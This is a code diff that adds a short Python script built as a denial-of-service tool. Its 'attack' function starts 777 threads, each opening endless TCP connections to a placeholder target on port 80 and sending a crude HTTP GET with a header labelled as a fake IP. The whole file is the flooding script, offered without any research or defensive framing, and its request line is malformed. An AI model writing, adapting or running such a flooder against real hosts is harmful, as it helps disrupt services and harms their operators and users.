@@ -1,0 +1,29 @@
+import socket
+import threading
+
+target = 'domainOrIp'
+port = 80
+fake_ip_header = '10.168.7.42'
+
+connected_tracker = 0
+
+def attack():
+    while True:
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        s.connect((target, port))
+        s.sendto(("GET /" + target + "HTTP/1.1\r\n").encode('ascii'), (target, port))
+        s.sendto(("Host: " + fake_ip_header + "\r\n\r\n").encode('ascii'), (target, port))
+        s.close()
+
+        global connected_tracker
+        connected_tracker += 1
+        print(connected_tracker)
+
+
+for i in range(777):
+    thread = threading.Thread(target=attack)
+    thread.start()
+
+
+
+
